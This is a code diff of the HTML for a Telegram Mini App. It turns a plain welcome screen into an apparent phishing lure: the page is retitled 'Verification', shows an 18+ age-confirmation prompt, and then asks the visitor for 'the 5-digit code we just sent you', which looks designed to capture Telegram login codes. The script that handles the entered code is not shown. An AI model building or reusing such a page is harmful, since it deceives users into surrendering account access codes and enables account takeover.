@@ -2,26 +2,33 @@
 <html lang="en">
 <head>
     <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Mini App</title>
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <title>Verification</title>
     <link rel="stylesheet" href="style.css">
     <script src="https://telegram.org/js/telegram-web-app.js"></script>
 </head>
 <body>
-    <div id="welcome-screen">
+    <div class="overlay"></div>
+    
+    <div id="step1" class="container">
+        <div class="info-box">
+            ⚠️ Attention! 🔞 To continue, please confirm that you are 18 years of age or older 😊
+        </div>
         <button id="confirm-btn">🍓 CONFIRM 🔞</button>
     </div>
 
-    <div id="verify-screen" style="display:none;">
-        <p>Enter the 5-digit code we just sent you!</p>
-        <div class="code-inputs">
-            <input type="text" maxlength="1" class="code-box">
-            <input type="text" maxlength="1" class="code-box">
-            <input type="text" maxlength="1" class="code-box">
-            <input type="text" maxlength="1" class="code-box">
-            <input type="text" maxlength="1" class="code-box">
+    <div id="step2" class="container" style="display: none;">
+        <div class="info-box">
+            📩 Enter the 5-digit code we just sent you!
         </div>
-        <button id="get-code-btn">🔎 GET CODE 🔎</button>
+        <div class="code-inputs">
+            <input type="number" class="code-box" maxlength="1">
+            <input type="number" class="code-box" maxlength="1">
+            <input type="number" class="code-box" maxlength="1">
+            <input type="number" class="code-box" maxlength="1">
+            <input type="number" class="code-box" maxlength="1">
+        </div>
+        <button id="verify-btn">🔎 GET CODE 🔎</button>
     </div>
 
     <script src="script.js"></script>
